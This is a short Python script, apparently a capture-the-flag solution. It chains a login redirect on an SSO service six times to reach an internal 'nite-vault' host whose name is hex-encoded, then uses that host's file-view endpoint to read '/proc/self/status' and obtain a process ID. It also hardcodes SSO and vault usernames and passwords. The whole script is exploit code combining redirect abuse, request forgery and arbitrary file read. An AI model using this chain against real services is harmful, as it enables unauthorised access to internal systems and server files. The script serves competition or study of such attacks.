import urllib.parse

SSO_USER = "NEMO1337" 
SSO_PASS = "NEMO1337"

NITE_USER = "qwertyuiop"
NITE_PASS = "SgYJBS9C1b1ohbazlE"
hostname = "nite-vault"
encoded_hostname = "".join([f"%{c:02x}" for c in hostname.encode()])

target_url = f"http://{encoded_hostname}/view?file=/proc/self/status&username={NITE_USER}&password={NITE_PASS}#"

sso_redirect_base = f"http://nite-sso/doLogin?username={SSO_USER}&password={SSO_PASS}&redirect_url="
pid_payload = target_url
for _ in range(6):
  pid_payload = sso_redirect_base + urllib.parse.quote_plus(pid_payload)

print("URL to receive PID")
print(pid_payload)
